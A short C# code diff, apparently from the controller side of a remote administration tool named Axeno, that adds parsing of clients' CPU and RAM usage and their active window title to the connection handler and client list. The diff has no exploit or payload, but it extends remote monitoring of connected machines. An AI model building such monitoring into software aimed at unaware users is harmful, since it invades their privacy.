@@ -21,7 +21,10 @@ namespace Axeno.Networking.Communication
             string username = msgpck.ForcePathObject("Username").AsString;
             string os = msgpck.ForcePathObject("Operatingsystem").AsString;
             string version = msgpck.ForcePathObject("Version").AsString;
+            string cpu = msgpck.ForcePathObject("CPU%").AsString;
+            string ram = msgpck.ForcePathObject("RAM%").AsString;
             string clientuid = msgpck.ForcePathObject("UID").AsString;
+            string activewin = msgpck.ForcePathObject("ActiveWin").AsString;
             if(clientuid == "N/A")
             {
                 clientuid = GetUID();
@@ -38,6 +41,9 @@ namespace Axeno.Networking.Communication
             thisclient.Client = cli;
             thisclient.operatingSystem = os;
             thisclient.ping = "N/A";
+            thisclient.cpuUsage= cpu;
+            thisclient.ramUsage= ram;
+            thisclient.activewin= activewin;
             cli.CurrentClient = thisclient;
 
             MainWindowSlides.lvClients.Items.Add(thisclient);
